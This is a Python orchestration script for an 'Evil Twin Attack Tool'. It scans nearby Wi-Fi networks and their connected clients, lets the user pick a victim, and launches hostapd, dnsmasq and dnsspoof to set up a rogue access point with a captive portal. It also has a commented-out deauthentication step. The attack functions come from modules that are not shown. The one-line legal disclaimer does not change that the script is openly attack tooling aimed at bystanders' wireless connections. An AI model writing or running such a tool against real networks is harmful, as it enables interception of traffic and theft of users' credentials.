import time, sys
import scan, attack
from threading import Thread

'''
This is the main script for the Evil Twin Attack Tool.
It provides a command-line interface for selecting target networks and clients,
and orchestrates the attack process using functions from scan.py and attack.py.'''

def display_networks():
    print("\nDiscovered Networks (with client counts):")
    print(f"{'Index':<6}{'BSSID':<20}{'SSID':<30}{'Signal':<8}{'Channel':<8}{'Sec':<10}{'Clients'}")
    networks = scan.get_networks()
    for idx, (bssid, det) in enumerate(networks.items()):
        count = len(scan.get_clients(bssid))
        print(f"{idx:<6}{bssid:<20}{det['SSID']:<30}{det['Signal']:<8}{det['Channel']:<8}{det['Security']:<10}{count}")


def display_clients(bssid):
    print(f"\nClients for BSSID {bssid}:")
    print(f"{'Index':<6}{'MAC':<20}{'Packets':<10}{'Last Seen'}")
    clients = scan.get_clients(bssid)
    for idx, (mac, info) in enumerate(clients.items()):
        print(f"{idx:<6}{mac:<20}{info['pkt_count']:<10}{info['last_seen']}")


def main():
    print("Welcome to the Evil Twin Attack Tool!")
    print("This tool allows you to perform an Evil Twin attack on Wi-Fi networks.")
    print("Make sure you have the necessary permissions and are in a legal environment.")
    print("-" * 50)
    print("Please select the interfaces for sniffing and AP mode.")
    print("You will need two interfaces: one for sniffing and one for creating the Evil AP.")
    print("Choose interface for sniffing first, then for AP mode.")
    print("-" * 50)
    iface = scan.select_interface()
    ap_iface = scan.select_interface()
    if not iface or not ap_iface:
        print("No valid interface selected. Exiting.")
        sys.exit(1)
    if iface == ap_iface:
        print("Cannot use the same interface for both sniffing and AP mode. Exiting.")
        sys.exit(1)
    print(f"Using interface for sniffing: {iface}")
    print(f"Using interface for AP mode: {ap_iface}")
    print("-" * 50)

    print(f"Starting sniffing on {iface}...")
    sniffer = scan.start_sniff(iface)

    # Warm-up phase: 60 seconds
    warmup = 10
    print(f"Gathering data for {warmup}s before menu...")
    time.sleep(warmup)

    try:
        while True:
            display_networks()
            nets = scan.get_networks()
            choice = input("Select network index, 'r' to refresh:").strip().lower()
            if choice == 'r':
                refresh = 5
                print(f"Refreshing data for {refresh}s...")
                time.sleep(refresh)
                continue
            if not choice.isdigit() or int(choice) not in range(len(nets)):
                print("Invalid choice.")
                continue

            idx = int(choice)
            bssid = list(nets.keys())[idx]
            ap_info = nets[bssid]

            while True:
                display_clients(bssid)
                clients = scan.get_clients(bssid)
                sub = input("Select client index, 'b' to go back:").strip().lower()
                if sub == 'b':
                    break
                if not sub.isdigit() or int(sub) not in range(len(clients)):
                    print("Invalid choice.")
                    continue

                client_mac = list(clients.keys())[int(sub)]
                print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
                print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")

                # 3) Bring up hostapd, dnsmasq and dnsspoof
                # Capture the process handles so you can shut them down cleanly later
                
                print("Starting hostapd/dnsmasq/dnsspoof…")
                procs = attack.start_attack(ap_iface, ap_info)

                # # 4) Deauth the victim until they associate to your Evil AP
                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
                print(f"Deauthenticating {client_mac} from {bssid}…")

                # 5) Stop sniffing now that the victim is “in”
                scan.stop_sniff.set()
                sniffer.join()

                # Keep the main thread alive to serve portal
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    for p in procs.values():
                        p.terminate()
                    print("Shutting down captive portal.")
                    sys.exit(0)
    except KeyboardInterrupt:
        pass
    finally:
        scan.stop_sniff.set()
        sniffer.join()
        print("Exiting.")

if __name__ == '__main__':
    main()
